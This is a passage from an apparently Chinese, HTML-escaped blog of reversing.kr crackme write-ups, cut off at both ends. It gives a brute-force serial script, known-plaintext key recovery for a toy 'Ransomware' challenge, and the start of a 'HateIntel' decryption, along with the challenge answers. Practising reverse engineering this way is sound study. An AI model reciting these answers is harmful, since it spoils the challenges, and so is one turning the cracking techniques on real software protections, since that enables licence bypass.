              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)ATL&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;CSimpleStringT&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;wchar_t&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;::&lt;/span&gt;GetAt(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v51, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v10 )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的 &lt;code&gt;if&lt;/code&gt; 语句要求了 serial，下面的 &lt;code&gt;if&lt;/code&gt; 要求了 &lt;code&gt;v40 + v8&lt;/code&gt; 需要等于输入的第一位&lt;/p&gt;
&lt;p&gt;同样的逻辑，约束了 &lt;code&gt;v46 + v36&lt;/code&gt; 等于输入的第二位&lt;/p&gt;
&lt;p&gt;直接写个脚本爆破一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;), ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;), ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
        v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
        v48 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
        v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
        v44 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
        v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;

        v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v40 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v8 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v46 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v36 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v42 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v38 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt;  v44 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v32 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v48 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v34 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;):
            print (chr(v6) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; chr(v7))
&lt;span style=&#34;color:#75715e&#34;&gt;# bu&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# cq&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# ft&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# gp&lt;/span&gt;

print ()
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v19 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;), ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
    &lt;span style=&#34;color:#75715e&#34;&gt;# for v20 in range(ord(&amp;#39;a&amp;#39;), ord(&amp;#39;z&amp;#39;) + 1):&lt;/span&gt;
    v20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;)
    v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v19 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    v49 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v19 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v19 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    v45 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v19 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    v47 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v19 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    
    v33 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    v39 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v41 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v47 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v37 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v43 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v39 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v45 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v33 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v49 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v35 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;):
        print (chr(v19) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; chr(v20))
&lt;span style=&#34;color:#75715e&#34;&gt;# mp&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本题多解，但平台好像只认 &lt;code&gt;bump&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;ransomware&#34;&gt;Ransomware&lt;/h2&gt;
&lt;p&gt;脱壳，然后发现有大量的无效指令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pop&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pop&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pusha&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;popa&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;要查看 main 的逻辑直接把开头几条指令 patch 下来就行&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 212; 
			flex-basis: 509px&#34;
	&gt;
	&lt;a href=&#34;/post/reversing-kr-writeups/ransomware_patch.png&#34; data-size=&#34;1203x567&#34;&gt;
		&lt;img src=&#34;/post/reversing-kr-writeups/ransomware_patch.png&#34;
			width=&#34;1203&#34;
			height=&#34;567&#34;
			srcset=&#34;/post/reversing-kr-writeups/ransomware_patch_hu0d6fe88e747d3da92c779e049619ff92_85514_480x0_resize_box_3.png 480w, /post/reversing-kr-writeups/ransomware_patch_hu0d6fe88e747d3da92c779e049619ff92_85514_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;重新生成一个函数就能看到反编译结果了&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 347px&#34;
	&gt;
	&lt;a href=&#34;/post/reversing-kr-writeups/ransomware_decompile.png&#34; data-size=&#34;667x461&#34;&gt;
		&lt;img src=&#34;/post/reversing-kr-writeups/ransomware_decompile.png&#34;
			width=&#34;667&#34;
			height=&#34;461&#34;
			srcset=&#34;/post/reversing-kr-writeups/ransomware_decompile_hu4667ed589b54e6b10827f34f6062550b_49101_480x0_resize_box_3.png 480w, /post/reversing-kr-writeups/ransomware_decompile_hu4667ed589b54e6b10827f34f6062550b_49101_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;根据 readme 可知，被加密的是一个 exe 文件，所以把 &lt;code&gt;file&lt;/code&gt; 的前十六个字节作为明文，&lt;code&gt;run.exe&lt;/code&gt; 的前十六个字节作为密文，算一下密钥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DE C0 1B 8C 8C 93 9E 86 98 97 9A 8C 73 6C 9A 8B&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [int(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a]
&lt;span style=&#34;color:#75715e&#34;&gt;# a = [222, 192, 27, 140, 140, 147, 158, 134, 152, 151, 154, 140, 115, 108, 154, 139]&lt;/span&gt;

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [int(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; p]
&lt;span style=&#34;color:#75715e&#34;&gt;# p = [77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0]&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i, j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(a, p):
    print (chr((&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; j), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# letsplaychesslet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然 Key 是 &lt;code&gt;letsplaychess&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;运行一下得到新的 exe，脱壳反汇编&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 265; 
			flex-basis: 636px&#34;
	&gt;
	&lt;a href=&#34;/post/reversing-kr-writeups/ransomware_flag.png&#34; data-size=&#34;480x181&#34;&gt;
		&lt;img src=&#34;/post/reversing-kr-writeups/ransomware_flag.png&#34;
			width=&#34;480&#34;
			height=&#34;181&#34;
			srcset=&#34;/post/reversing-kr-writeups/ransomware_flag_hu3471241ca7944adf89b33d06b598ae05_13106_480x0_resize_box_3.png 480w, /post/reversing-kr-writeups/ransomware_flag_hu3471241ca7944adf89b33d06b598ae05_13106_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;hateintel&#34;&gt;HateIntel&lt;/h2&gt;
&lt;p&gt;根据字符串找到关键函数&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 102; 
			flex-basis: 246px&#34;
	&gt;
	&lt;a href=&#34;/post/reversing-kr-writeups/hateintel_decompile.png&#34; data-size=&#34;648x631&#34;&gt;
		&lt;img src=&#34;/post/reversing-kr-writeups/hateintel_decompile.png&#34;
			width=&#34;648&#34;
			height=&#34;631&#34;
			srcset=&#34;/post/reversing-kr-writeups/hateintel_decompile_hu5e204fba7bea99258860fff327c7bd0f_55519_480x0_resize_box_3.png 480w, /post/reversing-kr-writeups/hateintel_decompile_hu5e204fba7bea99258860fff327c7bd0f_55519_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看加密函数&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 444px&#34;
	&gt;
	&lt;a href=&#34;/post/reversing-kr-writeups/hateintel_enc.png&#34; data-size=&#34;955x516&#34;&gt;
		&lt;img src=&#34;/post/reversing-kr-writeups/hateintel_enc.png&#34;
			width=&#34;955&#34;
			height=&#34;516&#34;
			srcset=&#34;/post/reversing-kr-writeups/hateintel_enc_hu9abd18e7e88ccd571343dd2d0ef46a1d_45943_480x0_resize_box_3.png 480w, /post/reversing-kr-writeups/hateintel_enc_hu9abd18e7e88ccd571343dd2d0ef46a1d_45943_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;总共 4 轮，加密是单字节循环左移 4 位&lt;/p&gt;
&lt;p&gt;解密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x92&lt;/span&gt;
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dec_byte&lt;/span&gt;(a, b):
